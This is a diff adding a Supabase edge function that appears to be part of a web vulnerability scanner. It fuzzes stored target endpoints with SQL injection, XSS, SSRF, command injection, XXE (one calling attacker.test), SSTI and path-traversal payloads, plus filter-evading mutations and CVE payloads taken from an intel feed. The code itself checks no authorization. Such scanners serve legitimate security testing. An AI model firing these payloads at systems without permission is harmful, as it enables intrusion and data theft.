@@ -1,0 +1,340 @@
+import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2.95.0/cors";
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2.95.0";
+
+const SCAN_START = Date.now();
+const MAX_MS = 50000;
+const timeLeft = () => MAX_MS - (Date.now() - SCAN_START);
+
+async function safeFetch(url: string, opts: RequestInit = {}, ms = 6000): Promise<Response> {
+  const ctrl = new AbortController();
+  const timer = setTimeout(() => ctrl.abort(), ms);
+  try {
+    return await fetch(url, { ...opts, signal: ctrl.signal });
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+// ─── PRO-LEVEL FUZZ CORPUS ──────────────────────────────
+// Multi-strategy: grammar-based, mutation-based, polyglot, encoding chains, time-based.
+const FUZZ_GRAMMARS: Record<string, string[]> = {
+  sqli_advanced: [
+    "' AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
+    "' AND IF(1=1,SLEEP(3),0)--",
+    "1' UNION SELECT NULL,@@version,NULL--",
+    "1) AND (SELECT * FROM(SELECT(SLEEP(3)))a)--",
+    "'||(SELECT pg_sleep(3))||'",
+    "1; WAITFOR DELAY '0:0:3'--",
+    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
+    "%27%20UNION%20SELECT%20NULL%2C%40%40version%2CNULL--",
+  ],
+  xss_polyglot: [
+    `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e`,
+    `"><svg/onload=alert(/XSS/)>`,
+    `<details open ontoggle=alert(1)>`,
+    `<img src=x onerror="javascript:alert(1)">`,
+    `<iframe srcdoc="<svg onload=alert(1)>">`,
+    `<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>`,
+  ],
+  ssrf_advanced: [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://[::1]:80/",
+    "http://localhost:6379/info",
+    "http://0.0.0.0:8080/",
+    "gopher://127.0.0.1:6379/_INFO",
+    "http://127.1/",
+    "http://0177.0.0.1/",
+    "http://2130706433/",
+    "file:///etc/passwd",
+    "dict://127.0.0.1:11211/stat",
+  ],
+  cmdi_advanced: [
+    "; sleep 3 #",
+    "| sleep 3",
+    "&& sleep 3",
+    "$(sleep 3)",
+    "`sleep 3`",
+    ";sleep${IFS}3",
+    "%0Asleep+3%0A",
+    "|| timeout 3",
+    "& ping -c 3 127.0.0.1",
+  ],
+  xxe_advanced: [
+    `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
+    `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.test/x.dtd">%p;]><r/>`,
+    `<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://169.254.169.254/">`,
+  ],
+  ssti_advanced: [
+    "{{7*7}}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "#{7*7}",
+  ],
+  nosqli_advanced: [
+    `{"$ne": null}`,
+    `{"$gt": ""}`,
+    `{"$where": "sleep(3000)"}`,
+    `{"$regex": ".*"}`,
+    `';return true;//`,
+  ],
+  path_traversal_advanced: [
+    "../../../../etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "....//....//....//etc/passwd",
+    "%252e%252e%252fetc%252fpasswd",
+    "..%c0%af..%c0%afetc%c0%afpasswd",
+    "/proc/self/environ",
+    "C:\\windows\\win.ini",
+  ],
+};
+
+// Genetic mutation operators
+function mutate(seed: string): string[] {
+  const variants: string[] = [];
+  // Case toggle
+  variants.push(seed.split("").map((c, i) => (i % 2 ? c.toUpperCase() : c.toLowerCase())).join(""));
+  // Comment injection (SQL/JS)
+  variants.push(seed.replace(/ /g, "/**/"));
+  // Double URL encode
+  variants.push(encodeURIComponent(encodeURIComponent(seed)));
+  // Null byte
+  variants.push(seed + "%00");
+  // Unicode escape
+  variants.push(seed.replace(/[a-z]/gi, (c) => `\\u00${c.charCodeAt(0).toString(16).padStart(2, "0")}`));
+  return variants.slice(0, 3);
+}
+
+interface FuzzResult {
+  url: string;
+  vulnClass: string;
+  payload: string;
+  strategy: string;
+  baselineStatus: number;
+  probeStatus: number;
+  bodyDeltaPct: number;
+  responseTimeMs: number;
+  anomaly: boolean;
+  signal: "high" | "medium" | "low" | "none";
+  notes: string;
+}
+
+async function fuzzEndpoint(
+  url: string,
+  vulnClass: string,
+  payloads: string[],
+  strategy: string
+): Promise<FuzzResult[]> {
+  const results: FuzzResult[] = [];
+
+  // Baseline
+  let baselineStatus = 0, baselineLen = 0, baselineMs = 0;
+  try {
+    const t0 = Date.now();
+    const r = await safeFetch(url, { method: "GET", headers: { "User-Agent": "CyberScope-ProFuzz/1.0" } }, 5000);
+    baselineMs = Date.now() - t0;
+    baselineStatus = r.status;
+    baselineLen = (await r.text()).length;
+  } catch { /* ignore */ }
+
+  for (const payload of payloads) {
+    if (timeLeft() < 4000) break;
+    const sep = url.includes("?") ? "&" : "?";
+    const probeUrl = `${url}${sep}q=${encodeURIComponent(payload)}`;
+    try {
+      const t0 = Date.now();
+      const r = await safeFetch(probeUrl, { method: "GET", headers: { "User-Agent": "CyberScope-ProFuzz/1.0" } }, 5000);
+      const ms = Date.now() - t0;
+      const body = await r.text().catch(() => "");
+      const delta = baselineLen > 0 ? Math.abs(body.length - baselineLen) / baselineLen : 0;
+
+      // Time-based detection (sleep 3 in payload)
+      const timeBased = /sleep\s*\(?\s*3|pg_sleep|WAITFOR|timeout 3|ping -c 3/i.test(payload);
+      const timeAnomaly = timeBased && ms > baselineMs + 2500;
+
+      const statusAnomaly = r.status >= 500 || (r.status !== baselineStatus && delta > 0.2);
+      const bodyAnomaly = delta > 0.3;
+      const errLeak = /SQL syntax|ORA-\d|MySQL|PostgreSQL|stack trace|Traceback/i.test(body);
+
+      const anomaly = timeAnomaly || statusAnomaly || bodyAnomaly || errLeak;
+      const signal: FuzzResult["signal"] =
+        timeAnomaly || errLeak ? "high"
+        : statusAnomaly ? "medium"
+        : bodyAnomaly ? "low"
+        : "none";
+
+      results.push({
+        url: probeUrl, vulnClass, payload, strategy,
+        baselineStatus, probeStatus: r.status,
+        bodyDeltaPct: Number((delta * 100).toFixed(2)),
+        responseTimeMs: ms,
+        anomaly, signal,
+        notes: anomaly
+          ? `${timeAnomaly ? "TIME-based" : ""}${errLeak ? " ERROR-leak" : ""}${statusAnomaly ? " STATUS-shift" : ""}${bodyAnomaly ? " BODY-delta" : ""}`.trim()
+          : "no anomaly",
+      });
+    } catch (e) {
+      results.push({
+        url: probeUrl, vulnClass, payload, strategy,
+        baselineStatus, probeStatus: 0, bodyDeltaPct: 0, responseTimeMs: 0,
+        anomaly: false, signal: "none",
+        notes: `error: ${(e as Error).message}`,
+      });
+    }
+  }
+  return results;
+}
+
+// Test CVE templates from intel_feeds against target endpoints
+async function testCveTemplates(
+  db: ReturnType<typeof createClient>,
+  targetId: string,
+  endpoints: Array<{ url: string }>
+): Promise<{ tested: number; confirmed: number; details: Array<Record<string, unknown>> }> {
+  const { data: feeds } = await db
+    .from("intel_feeds")
+    .select("id, title, vulnerability_class, extracted_payloads, severity, source_url")
+    .not("extracted_payloads", "is", null)
+    .limit(15);
+
+  if (!feeds || feeds.length === 0) return { tested: 0, confirmed: 0, details: [] };
+
+  const details: Array<Record<string, unknown>> = [];
+  let tested = 0, confirmed = 0;
+
+  for (const feed of feeds) {
+    if (timeLeft() < 5000) break;
+    const payloads = (feed.extracted_payloads as string[] | null) || [];
+    if (payloads.length === 0) continue;
+
+    // Test on first 3 endpoints
+    for (const ep of endpoints.slice(0, 3)) {
+      if (timeLeft() < 4000) break;
+      const payload = payloads[0];
+      const sep = ep.url.includes("?") ? "&" : "?";
+      const probeUrl = `${ep.url}${sep}q=${encodeURIComponent(payload)}`;
+      try {
+        const r = await safeFetch(probeUrl, { headers: { "User-Agent": "CyberScope-CVE/1.0" } }, 5000);
+        const body = await r.text().catch(() => "");
+        tested++;
+        const matched = r.status >= 500 || /SQL syntax|stack trace|Exception/i.test(body);
+        if (matched) {
+          confirmed++;
+          details.push({
+            cveTitle: feed.title, vulnClass: feed.vulnerability_class,
+            endpoint: ep.url, status: r.status, payload, severity: feed.severity,
+            sourceUrl: feed.source_url,
+          });
+          // Persist as finding
+          await db.from("vulnerability_findings").insert({
+            target_id: targetId,
+            title: `[CVE Match] ${feed.title}`,
+            severity: (feed.severity as "critical" | "high" | "medium" | "low" | "info") || "medium",
+            payload,
+            description: `Intel-feed CVE template matched on ${ep.url}. Source: ${feed.source_url}`,
+            confidence_score: 65,
+            confidence_level: "medium",
+            validation_status: "cve_template_matched",
+            triage_reasoning: `Advanced fuzzer matched CVE template "${feed.title}" against live endpoint.`,
+          });
+        }
+      } catch { /* skip */ }
+    }
+  }
+  return { tested, confirmed, details };
+}
+
+Deno.serve(async (req) => {
+  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
+
+  try {
+    const { targetId } = await req.json().catch(() => ({}));
+    if (!targetId) {
+      return new Response(JSON.stringify({ ok: false, error: "targetId required" }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 });
+    }
+
+    const db = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);
+
+    const { data: target } = await db.from("target_workspaces").select("*").eq("id", targetId).single();
+    if (!target) {
+      return new Response(JSON.stringify({ ok: false, error: "target not found" }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 });
+    }
+
+    const { data: endpoints } = await db.from("discovered_endpoints").select("url, method").eq("target_id", targetId).limit(8);
+    if (!endpoints || endpoints.length === 0) {
+      return new Response(JSON.stringify({ ok: false, error: "no endpoints — run recon first" }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 });
+    }
+
+    await db.from("scan_logs").insert({
+      target_id: targetId, log_type: "info",
+      message: `🚀 Pro-Level Fuzzer engaged on ${endpoints.length} endpoints (${Object.keys(FUZZ_GRAMMARS).length} strategies)`,
+    });
+
+    const allResults: FuzzResult[] = [];
+    const summary: Record<string, { total: number; anomalies: number }> = {};
+
+    // Round 1: grammar-based payloads on first 4 endpoints
+    for (const ep of endpoints.slice(0, 4)) {
+      if (timeLeft() < 6000) break;
+      for (const [vc, payloads] of Object.entries(FUZZ_GRAMMARS)) {
+        if (timeLeft() < 5000) break;
+        const r = await fuzzEndpoint(ep.url, vc, payloads.slice(0, 4), "grammar");
+        allResults.push(...r);
+        summary[vc] = summary[vc] || { total: 0, anomalies: 0 };
+        summary[vc].total += r.length;
+        summary[vc].anomalies += r.filter(x => x.anomaly).length;
+      }
+    }
+
+    // Round 2: genetic mutation on top-signal payloads
+    const topSignals = allResults.filter(r => r.signal === "high" || r.signal === "medium").slice(0, 5);
+    for (const seed of topSignals) {
+      if (timeLeft() < 5000) break;
+      const variants = mutate(seed.payload);
+      const r = await fuzzEndpoint(seed.url.split("?")[0], seed.vulnClass, variants, "genetic-mutation");
+      allResults.push(...r);
+    }
+
+    // Round 3: CVE template execution from intel_feeds
+    const cveReport = await testCveTemplates(db, targetId, endpoints);
+
+    // Persist high-signal anomalies as findings
+    const anomalies = allResults.filter(r => r.signal === "high");
+    for (const a of anomalies.slice(0, 10)) {
+      await db.from("vulnerability_findings").insert({
+        target_id: targetId,
+        title: `[Pro-Fuzz] ${a.vulnClass} anomaly via ${a.strategy}`,
+        severity: a.signal === "high" ? "high" : "medium",
+        payload: a.payload,
+        description: `Pro-level fuzzer detected ${a.notes} on ${a.url}. Status ${a.probeStatus}, ${a.bodyDeltaPct}% body delta, ${a.responseTimeMs}ms.`,
+        confidence_score: a.signal === "high" ? 75 : 55,
+        confidence_level: a.signal === "high" ? "high" : "medium",
+        validation_status: "fuzzer_anomaly",
+        triage_reasoning: `Strategy=${a.strategy}, vuln=${a.vulnClass}, signal=${a.signal}`,
+      });
+    }
+
+    await db.from("scan_logs").insert({
+      target_id: targetId, log_type: "result",
+      message: `✅ Pro-Fuzz complete — ${allResults.length} probes, ${anomalies.length} high-signal anomalies, ${cveReport.confirmed}/${cveReport.tested} CVE templates matched`,
+      metadata: { summary, cveReport },
+    });
+
+    return new Response(JSON.stringify({
+      ok: true,
+      totalProbes: allResults.length,
+      anomalies: anomalies.length,
+      summary,
+      cveReport,
+      topResults: allResults.filter(r => r.anomaly).slice(0, 20),
+    }), { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 });
+  } catch (err) {
+    return new Response(JSON.stringify({ ok: false, error: (err as Error).message }),
+      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 });
+  }
+});
